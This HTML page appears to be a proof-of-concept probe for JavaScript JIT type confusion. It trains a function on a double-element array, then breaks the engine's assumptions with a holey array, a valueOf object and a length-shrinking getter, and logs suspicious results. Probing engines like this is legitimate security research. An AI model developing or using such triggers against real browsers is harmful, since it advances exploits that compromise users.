<!doctype html>
<meta charset="utf-8">
<pre id="log"></pre>
<script>
const log = m => document.getElementById("log").textContent += m + "\n";

// =======================
// TARGET
// =======================
function vuln(a, i) {
    return a[i] + 1.1;
}

// =======================
// WARMUP (JIT expects double elements)
// =======================
let arr = [1.1, 2.2, 3.3, 4.4];

for (let i = 0; i < 100000; i++) {
    vuln(arr, 0);
}

// =======================
// BREAK ASSUMPTIONS
// =======================

// Step 1: make holey
delete arr[0];

// Step 2: change type
arr[0] = { valueOf() { return 13.37; } };

// Step 3: side-effect that changes length deterministically
Object.defineProperty(arr, 1, {
    get() {
        arr.length = 1;
        return 2.2;
    }
});

// =======================
// TRIGGER
// =======================
let r1 = vuln(arr, 0);
let r2 = vuln(arr, 1);

log("r1 = " + r1);
log("r2 = " + r2);

// =======================
// CHECKS (VALID SIGNAL ONLY)
// =======================

// harus number
if (typeof r1 !== "number" || typeof r2 !== "number") {
    log("❗ unexpected type (possible confusion)");
}

// cari nilai aneh (bukan coercion string)
if (Number.isFinite(r1) && Math.abs(r1) > 1e10) {
    log("❗ suspicious large float: " + r1);
}
if (Number.isFinite(r2) && Math.abs(r2) > 1e10) {
    log("❗ suspicious large float: " + r2);
}
</script>
